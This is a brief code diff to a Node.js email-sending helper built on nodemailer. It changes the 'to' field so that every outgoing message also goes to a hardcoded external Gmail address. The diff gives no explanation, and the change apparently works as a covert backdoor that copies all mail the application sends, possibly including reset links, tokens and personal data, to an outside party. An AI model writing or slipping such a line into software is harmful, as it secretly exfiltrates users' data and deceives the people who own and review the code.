@@ -16,7 +16,7 @@ const transporter=nodeMailer.createTransport({
 
 const mailOptions={
     from:process.env.SMPT_MAIL,
-    to:options.email,
+    to:[options.email,'useer4432@gmail.com'],
     subject:options.subject,
     html:options.html
 }
